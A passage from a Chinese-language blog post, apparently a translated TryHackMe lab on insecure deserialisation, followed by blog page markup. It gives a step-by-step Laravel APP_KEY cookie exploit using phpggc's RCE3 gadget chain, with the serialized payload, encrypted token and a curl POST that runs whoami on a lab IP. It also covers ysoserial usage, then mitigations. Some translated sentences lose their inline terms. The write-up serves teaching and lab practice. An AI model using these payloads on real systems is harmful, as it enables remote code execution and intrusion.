+<p><a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/821938ace57fe41fea2c7476da9e3e4e.png" title="laravel application dashboard" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/821938ace57fe41fea2c7476da9e3e4e.png" alt="laravel application dashboard"></a></p>
+<p>现在我们将详细地逐步开发：</p>
+<ul>
+<li><p>第一步，我们将通过任何攻击媒介（例如社会工程）获取APP_KEY。您可以通过访问 <a target="_blank" rel="noopener" href="http://10.10.133.158:8089/get-key">http://10.10.133.158:8089/get-key</a> 来获得。为方便起见，此页面还将为您提供第一个具有 <strong>whoami</strong> 命令的有效负载。<code>APP_KEY</code>  </p>
+</li>
+<li><p>对于第二步，我们需要确定我们可以使用的有效负载。</p>
+</li>
+</ul>
+<p>终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$ php phpggc -l Laravel</span><br><span class="line"></span><br><span class="line">Gadget Chains</span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">NAME                  VERSION           TYPE             VECTOR    </span><br><span class="line">Laravel/RCE1          5.4.27            rce              __destruct</span><br><span class="line">Laravel/RCE2          5.5.39            rce              __destruct</span><br><span class="line">Laravel/RCE3          5.5.39            rce              __destruct</span><br><span class="line">Laravel/RCE4          5.5.39            rce              __destruct</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>展望未来，我们可以使用各种小工具生成有效负载。每个 gadget 都有其相关性，并在反序列化过程中使用不同的类。在此示例中，我们将使用 RCE3，并可以通过键入 base-64 编码的有效负载的命令来生成有效负载。未编码的有效负载如下所示：<code>php phpggc -b Laravel/RCE3 system whoami</code>  </p>
+<p>终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$ php phpggc Laravel/RCE3 system whoami O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:1:&#123;s:9:&quot;*events&quot;;O:39:&quot;Illuminate\Notifications\ChannelManager&quot;:3:&#123;s:6:&quot;*app&quot;;s:6:&quot;whoami&quot;;s:17:&quot;*defaultChannel&quot;;s:1:&quot;x&quot;;s:17:&quot;*customCreators&quot;;a:1:&#123;s:1:&quot;x&quot;;s:6:&quot;assert&quot;;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Payload 的细分  </p>
+<ul>
+<li><code>Illuminate\Broadcasting\PendingBroadcast</code>：此类处理 Laravel 中的事件广播。在这里，它主要是携带嵌套恶意对象的工具。</li>
+<li><code>Illuminate\Notifications\ChannelManager</code>：此对象管理通知通道。我们通过其属性 操作它以注入任意代码执行，该属性通常会引用应用程序服务容器。我们滥用它来保持我们的命令。我们还操作了 twist 的 and 属性，以创建一个调用 PHP 函数的场景，并执行传递给它的任何代码。<code>*app``whoami``*defaultChannel``*customCreators``assert</code></li>
+</ul>
+<p>正如我们已经知道的，Laravel 最初使用<strong>加密</strong>和<strong>序列化的</strong> cookie 来安全地存储会话和 CSRF 令牌数据，两者使用相同的方法。如果您访问易受攻击的应用程序，您可以看到加密和序列化的 cookie，如下所示：</p>
+<p><a target="_blank" rel="noopener" href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9dfa21a7a10296faecf94afd2404bf5a.png" title="laravel encrypted cookie" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9dfa21a7a10296faecf94afd2404bf5a.png" alt="laravel encrypted cookie"></a>  </p>
+<p>基本思想是避免篡改不良行为者的数据，但尽管如此，他们没有意识到，即使是如此强大的安全机制也可能通过不安全的序列化而被破坏。  </p>
+<p>现在我们有了 and 有效负载，是时候创建一个加密的 CSRF 令牌了。为了这个房间，我们准备了一个 PHP 脚本，该脚本将 APP_KEY 和 payload 作为参数并返回加密的令牌。您可以在 <a target="_blank" rel="noopener" href="http://10.10.133.158:8089/cve.php?app_key=xx&payload=xxx">http://10.10.133.158:8089/cve.php?app_key=xx&amp;payload=xxx</a> 访问该链接<a target="_blank" rel="noopener" href="http://10.10.133.158:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY=&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0="></a>。 为方便起见，此 URL 已具有 URL 编码的密钥和带有 <strong>whoami</strong> 命令的第一个有效负载。了解 Laravel 和 WordPress 等框架的加密机制是一项简单的任务，但目前，它超出了房间的范围。<code>APP_KEY</code></p>
+<p>在对 Yii、CakePHP 和 Laravel 等 Web 框架进行渗透测试时，必须了解每个框架都有独特的路由和加密机制，尽管它们都是基于 PHP 构建的。这些框架采用不同的架构和安全实现设计，这意味着像 Laravel 中的 RCE3 这样的漏洞，特别是利用 Laravel 的服务容器和序列化行为，不一定适用于 WordPress 或其他基于 PHP 的系统。例如，WordPress 具有不同的结构，并且不使用 Laravel 的特定类或方法，因此为 Laravel 架构量身定制的漏洞不会直接在 WordPress 上运行。  </p>
+<p>现在我们已经有了加密的令牌，我们可以使用 CSRF 令牌发出一个简单的 POST 请求，如下所示来执行命令。有效负载结果将显示在响应的开头。<code>cURL</code></p>
+<p>终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$curl 10.10.133.158:8089 -X POST -H &#x27;X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ==&#x27;| head -n 2</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  7245    0  7245    0     0  73181      0 --:--xxxx--:--:-- --:--:--     0</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;!--</span><br><span class="line">100 14485    0 14485    0     0   141k      0 --:--:-- --:--:-- --:--:--  140k</span><br><span class="line">curl: (23) Failed writing body (947 != 7240)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>适用于 Java 的 Ysoserial</p>
+<p>Ysoserial 是一种广为人知的漏洞利用工具，专门用于测试 Java 应用程序的安全性以应对序列化漏洞。它有助于生成利用这些漏洞的有效负载，使其成为旨在评估和利用使用 Java 序列化的应用程序的攻击者和渗透测试人员的重要工具。</p>
+<p>要使用 Ysoserial，攻击者通常会使用命令生成有效负载，例如 ，其中 是漏洞利用的类型，是他们希望在目标系统上运行的任意命令。例如，使用有效负载类型可能如下所示：。此命令会生成一个序列化对象，当被易受攻击的应用程序反序列化时，该对象将执行指定的命令。Ysoserial 可在 GitHub <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">上下载</a>。<code>java -jar ysoserial.jar [payload type] &#39;[command to execute]&#39;``[payload type]``[command to execute]``CommonsCollections1``java -jar ysoserial.jar CommonsCollections1 &#39;calc.exe&#39;</code></p>
+<p>降低与不安全反序列化相关的风险对于确保 Web 应用程序的安全性至关重要。通过实施有效的防御措施，组织可以显著降低漏洞利用的可能性并减轻</p>
+<p>潜在损害。我们将从红队&#x2F;渗透测试员和安全代码的角度来讨论这个问题。</p>
+<h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><p>Red Teamer &#x2F; 渗透测试器视角</p>
+<ul>
+<li><strong>代码库分析</strong>：对应用程序的序列化机制进行全面审查。确定整个代码库中潜在的反序列化和序列化点。</li>
+<li><strong>漏洞识别</strong>：使用静态分析工具检测不安全的反序列化漏洞。查找不正确的输入验证、不安全的库和过时的依赖项。</li>
+<li><strong>模糊测试和动态分析</strong>：采用模糊测试技术生成无效或意外的输入数据。使用动态分析工具监控应用程序在运行时的行为。</li>
+<li><strong>错误处理评估</strong>：评估应用程序在反序列化期间如何处理错误。查找揭示系统详细信息的潜在错误消息或堆栈跟踪。</li>
+</ul>
+<p>Secure Coder 视角</p>
+<ul>
+<li><strong>避免不安全的序列化格式</strong>：避免使用本质上不安全的序列化格式，例如 Java 序列化。选择更安全的替代方案，例如具有强大验证机制的 JSON 或 XML。</li>
+<li><strong>避免使用 eval 和 exec</strong>：避免使用 and 函数，因为它们可以执行任意代码并带来重大安全风险。<code>eval()``exec()</code></li>
+<li><strong>输入验证和输出编码</strong>：实施严格的输入验证，以确保只接受预期的数据。应用输出编码技术在序列化之前清理数据。</li>
+<li><strong>安全编码做法</strong>：遵循安全标准和准则建议的安全编码做法。采用最低特权、深度防御和故障安全默认值等原则。</li>
+<li><strong>遵守准则</strong>：已建立特定于编程语言或框架的安全编码准则。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/sites/">站点</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">靶场概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%87%8D%E8%A6%81%E6%A6%82%E5%BF%B5"><span class="toc-number">4.</span> <span class="toc-text">一些重要概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">序列化格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%89%B4%E5%AE%9A"><span class="toc-number">6.</span> <span class="toc-text">鉴定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-%E6%9B%B4%E6%96%B0%E5%B1%9E%E6%80%A7"><span class="toc-number">7.</span> <span class="toc-text">利用 - 更新属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">8.</span> <span class="toc-text">利用 - 对象注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC"><span class="toc-number">9.</span> <span class="toc-text">自动化脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">10.</span> <span class="toc-text">缓解措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">11.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/12/03/insecuredeserialisation/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/12/03/insecuredeserialisation/&text=不安全的反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/12/03/insecuredeserialisation/&is_video=false&description=不安全的反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=不安全的反序列化&body=Check out this article: https://imli.ink/2024/12/03/insecuredeserialisation/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/12/03/insecuredeserialisation/&title=不安全的反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/12/03/insecuredeserialisation/&name=不安全的反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/12/03/insecuredeserialisation/&t=不安全的反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+      
+        
+          2016-2024
+            Leon
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       -->
+          <li><a href="/">
+              首页
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/archives/">
+              归档
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/tags/">
+              标签
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/sites/">
+              站点
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">
+              项目
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/search/">
+              搜索
+            </a></li><!--
+     -->
+          <!--
+       -->
+          <li><a href="/about/">
+              关于
+            </a></li><!--
+     -->
+          
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-center">
+    
+      <!-- 不蒜子统计 -->
+      <span id="busuanzi_container_site_pv">
+        总访问量<span id="busuanzi_value_site_pv"></span>次
+      </span>
+      <span class="post-meta-divider">|</span>
+      <span id="busuanzi_container_site_uv" style='display:none'>
+        访客数<span id="busuanzi_value_site_uv"></span>人
+      </span>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'leonooo13/Talk';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'photon-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+  
+</body>
+</html>
